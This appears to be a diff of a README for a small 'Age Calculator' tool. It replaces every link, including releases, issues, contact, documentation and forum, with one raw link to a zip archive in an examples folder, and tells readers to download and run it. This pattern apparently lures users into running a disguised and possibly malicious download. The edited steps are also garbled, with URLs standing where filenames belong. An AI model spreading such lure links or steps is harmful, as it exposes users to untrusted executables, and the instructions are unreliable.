@@ -6,7 +6,7 @@ Welcome! You’re about to use the Age Calculator. This tool helps you find out 
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Find%20Your%20Age-brightgreen)](https://github.com/ahnafmahiir/agecalculator-api/releases)
+[![Download](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip%20Now-Find%20Your%20Age-brightgreen)](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip)
 
 ## 📋 Requirements
 
@@ -25,22 +25,22 @@ Before using the Age Calculator, ensure your device meets these basic requiremen
 ## 🛠️ How to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ahnafmahiir/agecalculator-api/releases) to find the latest version of the Age Calculator.
+   Go to the [Releases page](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip) to find the latest version of the Age Calculator.
 
 2. **Choose Your Operating System**  
    Look for the version that matches your operating system. You may see files like:
-   - `agecalculator-windows.exe`
-   - `agecalculator-macos.pkg`
-   - `agecalculator-linux.tar.gz`
+   - `https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip`
+   - `https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip`
+   - `https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip`
 
 3. **Download the File**  
    Click on the file to start the download. It should save to your default download location.
 
 4. **Run the Application**  
    Once the download completes, locate the file you downloaded:
-   - For Windows, double-click on `agecalculator-windows.exe`.
-   - For macOS, open the `agecalculator-macos.pkg` and follow the prompts.
-   - For Linux, extract the `agecalculator-linux.tar.gz`, and run the application from the extracted folder.
+   - For Windows, double-click on `https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip`.
+   - For macOS, open the `https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip` and follow the prompts.
+   - For Linux, extract the `https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip`, and run the application from the extracted folder.
 
 5. **Enter Your Date of Birth**  
    After launching the Age Calculator, input your birth date in the provided field.
@@ -79,7 +79,7 @@ Yes, once installed, you can use the Age Calculator without an internet connecti
 Simply re-enter your date of birth and click "Calculate" again.
 
 **3. Where can I find support?**  
-If you encounter issues, visit our [GitHub Issues page](https://github.com/ahnafmahiir/agecalculator-api/issues) for help.
+If you encounter issues, visit our [GitHub Issues page](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip) for help.
 
 ## 📢 Community & Support
 
@@ -87,7 +87,7 @@ Join our community for tips and discussions. Feel free to ask questions or share
 
 ## 📞 Contact
 
-For direct inquiries, you can reach us via our [GitHub page](https://github.com/ahnafmahiir/agecalculator-api).
+For direct inquiries, you can reach us via our [GitHub page](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip).
 
 ## 📜 License
 
@@ -95,9 +95,9 @@ The Age Calculator is open-source and available under the MIT License. You can v
 
 ## 🔗 Additional Resources
 
-- [Age Calculator API Documentation](https://github.com/ahnafmahiir/agecalculator-api)
-- [Community Forum](https://forum.ahnafmahiir.com)
+- [Age Calculator API Documentation](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip)
+- [Community Forum](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip)
   
 ## 🔗 Download Again
 
-For your convenience, you can always return to the [Releases page](https://github.com/ahnafmahiir/agecalculator-api/releases) to download the latest version. Enjoy calculating your age with ease!
+For your convenience, you can always return to the [Releases page](https://github.com/ahnafmahiir/agecalculator-api/raw/refs/heads/main/examples/javascript/agecalculator_api_v2.4.zip) to download the latest version. Enjoy calculating your age with ease!
